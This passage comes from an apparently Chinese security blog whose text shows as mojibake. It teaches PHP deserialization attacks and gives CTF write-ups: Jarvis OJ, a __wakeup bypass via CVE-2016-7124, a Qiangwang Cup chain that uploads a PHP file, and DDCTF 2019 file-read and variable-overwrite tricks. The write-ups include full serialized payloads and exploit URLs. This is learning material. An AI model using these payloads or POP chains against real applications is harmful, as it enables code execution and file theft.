å½“è°ƒç”¨var_dump()æ‰“å°å¯¹è±¡æ—¶è¢«è°ƒç”¨ï¼ˆå½“ä½ ä¸æƒ³æ‰“å°æ‰€æœ‰å±æ€§ï¼‰é€‚ç”¨äºPHP5.6ç‰ˆæœ¬</code></pre>
                                    <p>ä¸¾ä¾‹ï¼š</p>
                                    <pre><code>    &lt;?php
class A{
    var $test = &quot;test&quot;;
    function __destruct(){
            echo $this-&gt;test;
    }
}
$a = $_GET[&apos;test&apos;];
$a_unser = unserialize($a);

?&gt;</code></pre>
                                    <p>æ„é€ ååºåˆ—åŒ–pocï¼Œç„¶åè§¦å‘é­”æœ¯æ–¹æ³•__destruct()ï¼ˆæ˜ç¡®é”€æ¯å¯¹è±¡æˆ–è„šæœ¬ç»“æŸæ—¶è¢«è°ƒç”¨ï¼‰,</p>
                                    <p>æ­£å¸¸è¾“å‡ºåº”è¯¥ä¸ºtestã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1559048926.jpg" alt>
                                    </p>
                                    <p>é€šè¿‡ä»£ç æ„é€ poc</p>
                                    <pre><code>&lt;?
class A{
    var $test = &quot;test&quot;;
    function __destruct(){
            echo $this-&gt;test;
    }
}
$c= new A();
$c-&gt;test=&quot;123456&quot;;
echo serialize($c);
echo &quot;&lt;br/&gt;&quot;;echo &quot;&lt;br/&gt;&quot;;
?&gt;</code></pre>
                                    <p>è·å¾—</p>
                                    <pre><code>O:1:&quot;A&quot;:1:{s:4:&quot;test&quot;;s:6:&quot;123456&quot;;}</code></pre>
                                    <p>æœ€ç»ˆå¯ä»¥ä»»æ„æ§åˆ¶è¾“å‡ºç»“æœã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1559049070.jpg" alt>
                                    </p>
                                    <p>ä¸€äº›é­”æœ¯æ–¹æ³•çš„ä½œç”¨ã€‚</p>
                                    <pre><code>&lt;?php
class test{
    public $abc=123;
    var $test = &apos;123&apos;;
    function __wakeup(){
        echo &quot;__wakeup&quot;;
        echo &quot;&lt;/br&gt;&quot;;
    }
    function __construct($filename = &apos;&apos;){
        $this -&gt; abc = $filename;
        echo &quot;__construct&quot;;
        echo &quot;&lt;/br&gt;&quot;;
    }
    function __destruct(){
        echo &quot;__destruct&quot;;
        echo &quot;&lt;/br&gt;&quot;;
    }
    function abc()
    {
        echo $this -&gt; abc ;
    }
}

$class2 = &apos;O:4:&quot;test&quot;:2:{s:3:&quot;abc&quot;;s:12:&quot;xiaozhupeiqi&quot;;s:4:&quot;test&quot;;s:3:&quot;123&quot;;}&apos;;

$class2_unser = unserialize($class2);
echo $class2_unser -&gt;abc();

echo &quot;&lt;/br&gt;&quot;;

?&gt;</code></pre>
                                    <p>ç»“æœã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1559053757.jpg" alt>
                                    </p>
                                    <p>ç›¸åŒçš„å‡½æ•°åï¼Œæ„é€ åˆ©ç”¨ã€‚</p>
                                    <pre><code>&lt;?php
class test {

    var $test1;
    function __construct() {
        $this-&gt;test = new xzpq();
    }
    function __destruct() {
        $this-&gt;test-&gt;func();
    }
}
class xzpq {
    function func() {
        echo &quot;serialize test&quot;;
    }
}
class xzpq1 {
    var $test2;
    function func() {
        eval($this-&gt;test2);
    }
}
$class = new test();
unserialize($_GET[&apos;test&apos;]);
?&gt;</code></pre>
                                    <p>æ­£å¸¸é“¾æ˜¯new test()å¯¹è±¡ï¼Œç„¶åé­”æœ¯æ–¹æ³•è°ƒç”¨ $this-&gt;test = new xzpq();
                                        ç„¶åä¸‹ä¸€ä¸ªé­”æœ¯æ–¹æ³•è°ƒç”¨func()å‡½æ•°æœ€ç»ˆè¾“å‡ºserialize test</p>
                                    <p>åˆ©ç”¨:åˆ©ç”¨ååºåˆ—åŒ–è§¦å‘ç¬¬ä¸€ä¸ªé­”æœ¯æ–¹æ³•ï¼Œè¦†ç›–ä½¿å…¶new
                                        xzpq1æ–¹æ³•ï¼Œç„¶åè‡ªåŠ¨è°ƒç”¨ç¬¬äºŒä¸ªfuncï¼Œåœ¨æ„é€ pocé‡Œä¼ å…¥test2å€¼è¾¾åˆ°ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>
                                    <pre><code>class test {

    var $test1;
    function __construct() {
        $this-&gt;test = new xzpq1();
    }
    function __destruct() {
        $this-&gt;test-&gt;func();
    }
}
class xzpq {
    function func() {
        echo &quot;serialize test&quot;;
    }
}
class xzpq1 {
    var $test2=&quot;phpinfo();&quot;;
    function func() {
        eval($this-&gt;test2);
    }
}
$class = new test();
echo serialize($class);</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1559091758.jpg" alt>
                                    </p>
                                    <h2 id="å®æˆ˜CTF-web"><a href="#å®æˆ˜CTF-web" class="headerlink"
                                                          title="å®æˆ˜CTF-web"></a>å®æˆ˜CTF-web</h2>
                                    <p>éš¾åº¦0.1</p>
                                    <p>url:<a href="http://web.jarvisoj.com:32768/index.php"
                                              target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php</a>
                                    </p>
                                    <p>æ¯”è¾ƒç®€å•ï¼Œè¯»å–æºç ï¼Œè¿™å°±ä¸è¯´äº†è‡ªå·±å»è¯»ï¼Œç„¶åè¿™æ˜¯ä¸‰ä¸ªæ–‡ä»¶æºç ã€‚</p>
                                    <p>shield.php</p>
                                    <pre><code>&lt;?php
    //flag is in pctf.php
    class Shield {
        public $file;
        function __construct($filename = &apos;&apos;) {
            $this -&gt; file = $filename;
        }

        function readfile() {
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE
            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
                return @file_get_contents($this-&gt;file);
            }
        }
    }
?&gt;</code></pre>
                                    <p>index.php</p>
                                    <pre><code>&lt;?php
    require_once(&apos;shield.php&apos;);
    $x = new Shield();
    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];
    if (!empty($g)) {
        $x = unserialize($g);
    }
    echo $x-&gt;readfile();
?&gt;
&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code></pre>
                                    <p>showimg.php</p>
                                    <pre><code>&lt;?php
    $f = $_GET[&apos;img&apos;];
    if (!empty($f)) {
        $f = base64_decode($f);
        if (stripos($f,&apos;..&apos;)===FALSE &amp;&amp; stripos($f,&apos;/&apos;)===FALSE &amp;&amp; stripos($f,&apos;\\&apos;)===FALSE
        &amp;&amp; stripos($f,&apos;pctf&apos;)===FALSE) {
            readfile($f);
        } else {
            echo &quot;File not found!&quot;;
        }
    }
?&gt;</code></pre>
                                    <p>æµç¨‹è§£æï¼š</p>
                                    <p>å¾ˆæ˜æ˜¾éœ€è¦index.php ä¸ shield.php
                                        ç»“åˆï¼Œä¼ å…¥classååºåˆ—åŒ–ä¸²ï¼Œä¼ å…¥å®Œæˆåè§¦å‘__construct æ–¹æ³•ï¼Œæ¥ä¼ å…¥fileå€¼ï¼Œç„¶ååˆ©ç”¨</p>
                                    <pre><code>function readfile() {
                if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE
                &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
                    return @file_get_contents($this-&gt;file);
                }</code></pre>
                                    <p>æ¥è¯»å–æºç ã€‚</p>
                                    <p>æ„é€ pocï¼š<br> &lt;?php<br> class Shield {<br> public $file;<br>
                                        function __construct($filename = â€˜â€™) {<br> $this -&gt; file
                                        = $filename;<br> }</p>
                                    <pre><code>        function readfile() {
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE
            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {
                return @file_get_contents($this-&gt;file);
            }
        }
    }

$a=new shield();
$a-&gt;file=&quot;pctf.php&quot;;
echo serialize($a);

?&gt;</code></pre>
                                    <p><img src="http://47.106.185.69/1/./img/1559051080.jpg" alt>
                                    </p>
                                    <p><img src="http://47.106.185.69/1/./img/1559051188.jpg" alt>
                                    </p>
                                    <h2 id="web1"><a href="#web1" class="headerlink"
                                                     title="web1"></a>web1</h2>
                                    <p>é¢˜ç›®æ‰“å¼€ï¼š</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555749777.jpg" alt>
                                    </p>
                                    <p>å³é”®æŸ¥çœ‹æºç ï¼Œ</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555749843.jpg" alt>
                                    </p>
                                    <p>å‘ç°æ˜¯æ–‡ä»¶åŒ…å«ï¼Œå¹¶ä¸”æœ‰æç¤ºhint.phpã€‚ </p>
                                    <p>ä½¿ç”¨php://filter/read=convert.base64-encode/resource=index.php
                                        ï¼Œåˆ†åˆ«è¯»å‡ºindex.phpå’Œhint.phpæºç ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555750520.jpg" alt>
                                    </p>
                                    <p>index.php</p>
                                    <pre><code>&lt;html&gt;
&lt;?php
error_reporting(0);
$file = $_GET[&quot;file&quot;];
$payload = $_GET[&quot;payload&quot;];
if(!isset($file)){
    echo &apos;Missing parameter&apos;.&apos;&lt;br&gt;&apos;;
}
if(preg_match(&quot;/flag/&quot;,$file)){
    die(&apos;hack attacked!!!&apos;);
}
@include($file);
if(isset($payload)){
    $url = parse_url($_SERVER[&apos;REQUEST_URI&apos;]);
    parse_str($url[&apos;query&apos;],$query);
    foreach($query as $value){
        if (preg_match(&quot;/flag/&quot;,$value)) {
            die(&apos;stop hacking!&apos;);
            exit();
        }
    }
    $payload = unserialize($payload);
}else{
   echo &quot;Missing parameters&quot;;
}
?&gt;
&lt;!--Please test index.php?file=xxx.php --&gt;
&lt;!--Please get the source of hint.php--&gt;
&lt;/html&gt;</code></pre>
                                    <p>hint.php</p>
                                    <pre><code>&lt;?php
class Handle{
    private $handle;
    public function __wakeup(){
        foreach(get_object_vars($this) as $k =&gt; $v) {
            $this-&gt;$k = null;
        }
        echo &quot;Waking up\n&quot;;
    }
    public function __construct($handle) {
        echo 123;
        $this-&gt;handle = $handle;

    }
    public function __destruct(){

        echo 456;
        $this-&gt;handle-&gt;getFlag();

    }
}

class Flag{
    public $file;
    public $token;
    public $token_flag;

    function __construct($file){
        $this-&gt;file = $file;
        $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));
    }

    public function getFlag(){
        echo &quot;666&quot;;
        $this-&gt;token_flag = md5(rand(1,10000));
        if($this-&gt;token === $this-&gt;token_flag)
        {
            if(isset($this-&gt;file)){
                echo @highlight_file($this-&gt;file,true);
            }
        }
    }
}
?&gt;</code></pre>
                                    <p>
                                        index.phpä¸­å¯ä»¥ä¼ å‚ä¸¤ä¸ªå‚æ•°ï¼Œå¹¶ä¸”æœ‰æ˜æ˜¾çš„ååºåˆ—åŒ–å‡½æ•°unserializeï¼Œåº”è¯¥æ˜¯ååºåˆ—åŒ–æ¼æ´ï¼Œåœ¨é¦–å…ˆfileåŒ…å«hint.phpæ‰èƒ½è°ƒç”¨classè¯»å–flag.phpã€‚ä½†æ˜¯æ— æ³•è¯»å–flag.phpï¼Œæœ‰æ˜æ˜¾çš„æ­£åˆ™æ‹¦æˆªã€‚ </p>
                                    <pre><code>parse_str($url[&apos;query&apos;],$query);
foreach($query as $value){</code></pre>
                                    <p>å°†å½“å‰èµ‹å€¼ç»™ç½‘ç«™å‚æ•°å€¼èµ‹å€¼ç»™valueï¼Œä½¿ç”¨åŒæ–œçº¿ä½¿å¾—$url[â€˜queryâ€™]æ— æ•ˆï¼Œç»•è¿‡ç¬¬äºŒä¸ªè¿‡æ»¤ã€‚</p>
                                    <p>ååºåˆ—åŒ–è§£æï¼š</p>
                                    <p>ä¼ å…¥payloadä¼šè¢«ååºåˆ—åŒ–ï¼Œä¼ å…¥ç‰¹å®šåºåˆ—åŒ–å‚æ•°ï¼Œå®ä¾‹åŒ–Handleç±»ï¼Œä¼ å…¥$handleå‚æ•°å®ä¾‹åŒ–class
                                        Flagï¼Œåœ¨Handleç±»é‡Œé”€æ¯æ—¶è°ƒç”¨é­”æ³•å‡½æ•°function __destruct()è°ƒç”¨$this-&gt;handle-&gt;getFlag();æ¥æ‰§è¡Œflagå‡½æ•°ï¼ŒFlagç±»éœ€è¦ä¼ å…¥fileå‚æ•°ï¼Œè¿™é‡Œä¼ å…¥flag.phpä»£ç ï¼Œä»è€Œè¯»å–flag.phpçš„æºç è·å¾—flagã€‚</p>
                                    <p>åœ¨hint.php ç”Ÿæˆåºåˆ—åŒ–payloadã€‚åŠ å…¥ä»¥ä¸‹ä»£ç </p>
                                    <pre><code>#$a = new Flag(&apos;./flag.php&apos;);

#$test = new Handle($a);

#echo serialize($test);</code></pre>
                                    <p>
                                        å…¶ä¸­handleæ˜¯privateæ‰€ä»¥éœ€è¦æ”¹æˆ%00Handle%00handleï¼ŒåŒ//ç»•è¿‡valueæ‹¦æˆªflagå­—æ®µã€‚æœ€ç»ˆpayloadï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šè°ƒç”¨wakeupæ–¹æ³•ï¼Œç»•è¿‡æ–¹å¼ã€‚</p>
                                    <pre><code>wakeupæ–¹æ³•(CVE-2016-7124)

 O:6:&quot;sercet&quot;:1:  ä¹Ÿå°±æ˜¯è¾“å…¥æ¯”1å¤§çš„å€¼å°±è¡Œ   å¦‚O:6:&quot;sercet&quot;:2: </code></pre>
                                    <p>æœ€ç»ˆpayload</p>
                                    <pre><code>http://604abe9ee70d4acab8aea61f547235a56c60f822bc734cf3.changame.ichunqiu.com//index.php?file=hint.php&amp;payload=O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:10:%22./flag.php%22;s:5:%22token%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;s:10:%22token_flag%22;s:32:%22ab4c389364232588a6680ad92ec170c7%22;}}</code></pre>
                                    <p>ç›´æ¥è®¿é—®è¯·æ±‚å³å¯è„šæœ¬è·‘å‡ºmd5ï¼ŒæŒ‰æ¦‚ç‡å­¦æ¥è¯´ä¸€ä¸‡ä¸ªå°±èƒ½ç™¾åˆ†ç™¾è·‘å‡ºæ¥ã€‚ç›¸ç­‰å³å¯è·å¾—flagã€‚</p>
                                    <h2 id="å¼ºç½‘æ¯â€“upload"><a href="#å¼ºç½‘æ¯â€“upload" class="headerlink"
                                                           title="å¼ºç½‘æ¯â€“upload"></a>å¼ºç½‘æ¯â€“upload</h2>
                                    <p>è®¿é—® <a href="http://www.tar.gz" target="_blank"
                                             rel="noopener">www.tar.gz</a> ä¸‹è½½æºç ã€‚</p>
                                    <p>å››ä¸ªæ ¸å¿ƒæ–‡ä»¶ï¼Œä¸Šä¼ å‘ç°æ˜¯ä¸Šä¼ ä¹‹åå…¨éƒ¨é‡æ–°å‘½åï¼ŒæœåŠ¡å™¨å‘½ååç¼€æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯æœ‰åºåˆ—åŒ–å‡½æ•°ï¼Œæ¨æ–­å¾ˆå¯èƒ½æ˜¯ååºåˆ—åŒ–æ¼æ´ã€‚</p>
                                    <p>å‘ç°profileæ–‡ä»¶é‡Œçš„callé­”æœ¯æ–¹æ³•ã€‚</p>
                                    <pre><code>public function __call($name, $arguments)
{
    if($this-&gt;{$name}){
        $this-&gt;{$this-&gt;{$name}}($arguments);
    }
}</code></pre>
                                    <p>åˆ©ç”¨è¿™ä¸€è¡Œ$this-&gt;{$this-&gt;{$name}}($arguments);
                                        å¦‚æœå¯ä»¥æ§åˆ¶nameä»¥åŠargumentså€¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥è°ƒç”¨ä»»æ„æ–¹æ³•äº†ã€‚</p>
                                    <p>å‘ç°uploadä¸­æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ã€‚@copy($this-&gt;filename_tmp, $this-&gt;filename);ï¼Œå¦‚æœè¿™åé¢çš„å‚æ•°å¯æ§ï¼Œé‚£ä¹ˆæˆ‘ä¹ˆå°±å¯ä»¥ä»»æ„æ§åˆ¶å‘½åã€‚å°±å¯ä»¥ä¸Šä¼ PHPæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±éœ€è¦ç»•è¿‡è¿™ä¸ªç‚¹ã€‚</p>
                                    <pre><code>if(!empty($_FILES)){
           $this-&gt;filename_tmp=$_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];
           $this-&gt;filename=md5($_FILES[&apos;upload_file&apos;][&apos;name&apos;]).&quot;.png&quot;;
           $this-&gt;ext_check();
       }</code></pre>
                                    <p>é‚£ä¹ˆæœ¬é¢˜å°±æ˜¯ç»•è¿‡emptyæ£€æµ‹ï¼Œç„¶ååˆ©ç”¨é­”æœ¯æ–¹æ³•è°ƒç”¨upload_imgè¿›è¡Œä¸Šä¼ ã€‚</p>
                                    <p>é‚£ä¹ˆä¸‹ä¸€æ­¥å¯»æ‰¾ååºåˆ—åŒ–ç‚¹ï¼Œå‘ç°ä¼šå°†æˆ‘ä»¬çš„cookieååºåˆ—åŒ–</p>
                                    <pre><code>if(!empty($profile)){
    $this-&gt;profile=unserialize(base64_decode($profile));
    $this-&gt;profile_db=db(&apos;user&apos;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&apos;ID&apos;]))-&gt;find();
    if(array_diff($this-&gt;profile_db,$this-&gt;profile)==null){
        return 1;
    }else{
        return 0;
    }
}</code></pre>
                                    <p>è¦è¿›å…¥callé­”æœ¯æ–¹æ³•éœ€è¦æ¡ä»¶ã€‚å½“è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ï¼Œå°±ä¼šè°ƒç”¨__call();</p>
                                    <p>å¦‚æˆ‘ä»¬æ§åˆ¶ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œä½¿ä¹‹ååºåˆ—åŒ–Registerç±»ï¼Œæ§åˆ¶$this-&gt;checkerä¸ºProfileç±»ï¼Œå°±å¯ä»¥å¯¹Profileç±»è°ƒç”¨index()æ–¹æ³•ï¼Œè€Œåœ¨Profileç±»ä¸­ä¸å­˜åœ¨æ­¤æ–¹æ³•ï¼Œå°±ä¼šè¿›å…¥__callæ–¹æ³•ï¼Œç„¶åcallæ–¹æ³•ç›´æ¥è°ƒç”¨
                                        upload_img() å‡½æ•°ï¼Œä»è€Œä¸Šä¼ ã€‚ä½†æ˜¯<br> ä»£ç ä¸€ï¼š$this-&gt;checker-&gt;index();
                                    </p>
                                    <pre><code>ä»£ç äºŒï¼š$this-&gt;{$this-&gt;{$name}}($arguments);</code></pre>
                                    <p>è¿™é‡Œè°ƒç”¨çš„æ˜¯Profile-&gt;index(),æ— æ³•æ§åˆ¶ï¼Œæ‰€ä»¥æ­¤æ—¶éœ€è¦å¯»æ‰¾å¯ä»¥è°ƒç”¨å¯æ§çš„æ–¹æ³•ï¼Œå› ä¸ºindex()æ–¹æ³•ä¸å­˜åœ¨ï¼Œæ‰€ä»¥è°ƒç”¨é­”æœ¯æ–¹æ³•</p>
                                    <pre><code>public function __get($name)               //å¦‚æœè°ƒç”¨çš„å˜é‡å±æ€§ä¸å­˜åœ¨ï¼Œååºåˆ—åŒ–å°±ä¼šé»˜è®¤è°ƒç”¨__get()æ–¹æ³•ï¼Œ$nameæ˜¯å±æ€§å
   {
       return $this-&gt;except[$name];
   }</code></pre>
                                    <p>ç„¶åä¼ å…¥å¯æ§å˜é‡$this-&gt;except[$name];
                                        ç„¶åä¼ å…¥upload_imgï¼Œæœ€ç»ˆè°ƒç”¨upload_imgå‡½æ•°ï¼Œç„¶ååœ¨è¦†ç›–å˜é‡ï¼Œ</p>
                                    <pre><code>$pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;;
$pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;;</code></pre>
                                    <p>ç„¶åå°±èƒ½æœ€ç»ˆä¸Šä¼ ä¸Šå»phpæ–‡ä»¶ã€‚</p>
                                    <pre><code>payload:

&lt;?php
namespace app\web\controller;

class Profile{
    public $ext;
    public $filename_tmp;
    public $filename;
    public $except;
}

class Register{

    public $checker;
    public $registed;

}

$reg = new Register();
$pro = new Profile();
$pro-&gt;except = array(&apos;index&apos;=&gt;&apos;upload_img&apos;);
$pro-&gt;ext = 1;
$pro-&gt;filename_tmp = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/b1a224c24d78e208556d6206b9ec7c72.png&apos;;
$pro-&gt;filename = &apos;upload/9862a5f0c459c3f78ba4bab12279ea3d/gurenmeng.php&apos;;
$reg-&gt;checker = $pro;
$reg-&gt;registed = 0;
echo base64_encode(serialize($reg));

?&gt;</code></pre>
                                    <p>æ”¶è—æ–‡ç« ï¼š<a
                                            href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"
                                            target="_blank" rel="noopener">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a>
                                    </p>
                                    <p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/youyoui/p/8610068.html"
                                             target="_blank" rel="noopener">https://www.cnblogs.com/youyoui/p/8610068.html</a><br>å‚è€ƒï¼š<a
                                            href="https://www.freebuf.com/articles/web/167721.html"
                                            target="_blank" rel="noopener">https://www.freebuf.com/articles/web/167721.html</a>
                                    </p>


                                </div>


                                <footer class="post-footer">


                                    <div class="post-eof"></div>

                                </footer>
                            </div>


                        </article>


                        <article class="post post-type-normal" itemscope
                                 itemtype="http://schema.org/Article">


                            <div class="post-block">
                                <link itemprop="mainEntityOfPage"
                                      href="http://yoursite.com/2019/04/14/2019DDCTF/">

                                <span hidden itemprop="author" itemscope
                                      itemtype="http://schema.org/Person">
      <meta itemprop="name" content="å°çŒªä½©å¥‡">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.ico">
    </span>

                                <span hidden itemprop="publisher" itemscope
                                      itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Sec-Communication">
    </span>


                                <header class="post-header">


                                    <h1 class="post-title" itemprop="name headline">

                                        <a class="post-title-link" href="/2019/04/14/2019DDCTF/"
                                           itemprop="url">2019DDCTF</a></h1>


                                    <div class="post-meta">
          <span class="post-time">

              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>

                <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished"
                    datetime="2019-04-14T00:00:00+08:00">
                2019-04-14
              </time>





          </span>


                                    </div>
                                </header>


                                <div class="post-body" itemprop="articleBody">


                                    <p><img src="http://47.106.185.69/1/./img/1555234353.jpg" alt>
                                    </p>
                                    <h1 id="æ»´"><a href="#æ»´" class="headerlink" title="æ»´"></a>æ»´</h1>
                                    <p><img src="http://47.106.185.69/1/./img/1555234297.jpg" alt>
                                    </p>
                                    <p>è¿›å…¥é¢˜ç›®ï¼Œè§‚å¯Ÿurl </p>
                                    <pre><code>http://117.51.150.246/index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09</code></pre>
                                    <p>æ¯”è¾ƒæ˜æ˜¾åº”è¯¥æ˜¯base64ç¼–ç äº†ã€‚</p>
                                    <p>ä¸¤æ¬¡base64è§£ç ã€‚</p>
                                    <pre><code>666C61672E6A7067 </code></pre>
                                    <p>åº”è¯¥ä¸º16è¿›åˆ¶ï¼Œç›´æ¥åå…­è¿›åˆ¶è½¬åŒ–å­—ç¬¦ä¸²ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555234263.jpg" alt>
                                    </p>
                                    <p>åªè¦æ–‡ä»¶å­˜åœ¨åº”è¯¥å°±å¯ä»¥è¯»å–æ–‡ä»¶ï¼Œdirsearchæ‰«æç›®å½•ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555238585.jpg" alt>
                                    </p>
                                    <p>å°è¯•è¯»å–index.phpæ–‡ä»¶ï¼ŒæŸ¥çœ‹æºç ã€‚å‘ç°base64çš„ dataæ•°æ®æµã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555238797.jpg" alt>
                                    </p>
                                    <p>è§£ç base64å¾—åˆ°æºç ã€‚</p>
                                    <pre><code>&lt;?php
/*
 * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
 * Date: July 4,2018
 */
error_reporting(E_ALL || ~E_NOTICE);


header(&apos;content-type:text/html;charset=utf-8&apos;);
if(! isset($_GET[&apos;jpg&apos;]))
    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);
$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));
echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;
$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);
echo $file.&apos;&lt;/br&gt;&apos;;
$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);
echo $file.&apos;&lt;/br&gt;&apos;;
$txt = base64_encode(file_get_contents($file));

echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;
/*
 * Can you find the flag file?
 *
 */
?&gt;</code></pre>
                                    <p>
                                        æ­£åˆ™ç»•äº†åŠå¤©ï¼Œå‘ç°ç»•ä¸è¿‡å»ï¼Œæ­¤æ—¶ä¸Šé¢æœ‰ä¸ªæ³¨é‡Šä¸€ç¯‡æ–‡ç« ï¼Œåº”è¯¥æ˜¯æœ‰æ ¹æ®å‡ºç°çš„ã€‚è¿™ä¸ªé¢˜ç¡®å®å‘ï¼Œå‡ºçš„æ²¡å•¥æ„ä¹‰ï¼Œæœ€åå‘ç°å’Œè¿™ç¯‡æ–‡ç« æ²¡å•¥å…³ç³»ï¼Œè¿˜æœ‰ä¸€è¡Œæ³¨é‡ŠDate:
                                        July 4,2018ï¼Œæ‰¾åˆ°è¿™ä¸€å¤©æ—¥æœŸçš„æ–‡ç« ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555239052.jpg" alt>
                                    </p>
                                    <p>æ–‡ä¸­å¤šæ¬¡åœˆäº†practice.txt.swpæ–‡ä»¶ï¼ŒæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶ã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555239153.jpg" alt>
                                    </p>
                                    <p>å¾—åˆ°äº†æ–°çš„æç¤ºï¼ŒæŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„æºç ï¼Œä½†æ˜¯ä¸Šæ–‡æ­£åˆ™ä¸å…è®¸å‡ºç°ï¼ï¼Œç›¸åº”çš„ä¸‹é¢ç»™äº†æç¤ºï¼Œconfigä¼šè‡ªåŠ¨æ›¿æ¢æˆï¼ï¼Œ</p>
                                    <p>f1ag!ddctf.php æ„é€ 
                                        f1agconfigddctf.phpåœ¨è¿›è¡Œ16è¿›åˆ¶ä¸¤æ¬¡base64ç¼–ç ï¼Œå¾—åˆ°base64çš„æºç ä¸ºï¼š</p>
                                    <pre><code>&lt;?php
include(&apos;config.php&apos;);
$k = &apos;hello&apos;;
extract($_GET);
if(isset($uid))
{
    $content=trim(file_get_contents($k));
    if($uid==$content)
    {
        echo $flag;
    }
    else
    {
        echo&apos;hello&apos;;
    }
}

?&gt;</code></pre>
                                    <p>å˜é‡è¦†ç›–æ‰åŸæ¥çš„contentï¼Œç½®ä¸ºç©ºå¾—åˆ°flagã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555239451.jpg" alt>
                                    </p>
                                    <h1 id="webç­¾åˆ°é¢˜ç›®"><a href="#webç­¾åˆ°é¢˜ç›®" class="headerlink"
                                                        title="webç­¾åˆ°é¢˜ç›®"></a>webç­¾åˆ°é¢˜ç›®</h1>
                                    <p><img src="http://47.106.185.69/1/./img/1555237562.jpg" alt>
                                    </p>
                                    <p>æŠ“åŒ…ï¼Œå‘ç°å­˜åœ¨ç¬¬äºŒä¸ªåŒ…ï¼Œç¬¬ä¸€ä¸ªæç¤ºæ²¡æœ‰æƒé™ï¼Œå°è¯•å¡«å†™adminç®¡ç†å‘˜ï¼ŒæˆåŠŸè¿”å›phpç›®å½•æç¤ºã€‚</p>
                                    <p><img src="http://47.106.185.69/1/./img/1555240122.jpg" alt>
                                    </p>
                                    <p>æ‰“å¼€app//fL2XID2i0Cdh.php æ–‡ä»¶è·å¾—æºç ã€‚</p>
                                    <pre><code>url:app/Application.php


Class Application {
    var $path = &apos;&apos;;


    public function response($data, $errMsg = &apos;success&apos;) {
        $ret = [&apos;errMsg&apos; =&gt; $errMsg,
            &apos;data&apos; =&gt; $data];
        $ret = json_encode($ret);
        header(&apos;Content-type: application/json&apos;);
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = &apos;admin&apos;;
        if(!empty($_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;]) &amp;&amp; $_SERVER[&apos;HTTP_DIDICTF_USERNAME&apos;] == $DIDICTF_ADMIN) {
